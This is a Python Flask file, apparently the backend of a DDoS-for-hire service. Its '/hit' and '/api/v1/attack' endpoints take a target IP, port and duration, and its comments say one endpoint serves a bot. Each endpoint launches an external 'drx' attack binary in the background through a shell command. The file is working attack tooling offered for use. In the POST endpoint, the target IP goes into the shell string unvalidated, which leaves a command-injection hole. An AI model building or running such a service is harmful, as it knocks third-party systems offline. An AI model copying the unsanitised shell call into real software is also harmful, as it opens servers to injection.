from flask import Flask, request, jsonify
import subprocess
import os
import time

app = Flask(__name__)

# Security Token
API_AUTH_TOKEN = "DRX_POWER_ULTRA_V4"   # ← Isse change kar dena strong password mein

# ===================== MAIN ATTACK ENDPOINT =====================
@app.route('/hit', methods=['GET'])
def start_attack():
    token = request.args.get('token')
    if token != API_AUTH_TOKEN:
        return jsonify({"status": "error", "message": "Unauthorized Access"}), 403

    target_ip = request.args.get('ip')
    target_port = request.args.get('port')
    duration = request.args.get('time', "300")

    if not target_ip or not target_port:
        return jsonify({"status": "error", "message": "Missing IP or Port"}), 400

    if not target_port.isdigit() or not duration.isdigit():
        return jsonify({"status": "error", "message": "Invalid Port or Time format"}), 400

    try:
        # Run DRX Attack in background
        command = f"nohup ./drx {target_ip} {target_port} {duration} > /dev/null 2>&1 &"
        subprocess.Popen(command, shell=True)
        
        return jsonify({
            "status": "success",
            "message": "Attack Launched Successfully",
            "host": target_ip,
            "port": target_port,
            "time": duration,
            "vps_status": "32GB_POWER_MAX"
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


# ===================== Bot ke liye Extra Endpoint (POST) =====================
@app.route('/api/v1/attack', methods=['POST'])
def bot_attack():
    token = request.headers.get('x-api-key')
    if token != API_AUTH_TOKEN:
        return jsonify({"success": False, "error": "Unauthorized"}), 403

    data = request.get_json()
    target_ip = data.get('ip')
    target_port = data.get('port')
    duration = int(data.get('duration', 300))

    if not target_ip or not target_port:
        return jsonify({"success": False, "error": "IP and Port required"}), 400

    try:
        command = f"nohup ./drx {target_ip} {target_port} {duration} > /dev/null 2>&1 &"
        subprocess.Popen(command, shell=True)

        attack_id = f"drx_{int(time.time())}"

        return jsonify({
            "success": True,
            "attack": {
                "id": attack_id,
                "endsAt": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + duration))
            }
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


# Health Check
@app.route('/')
def home():
    return "DRX POWER API IS LIVE ✅"


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)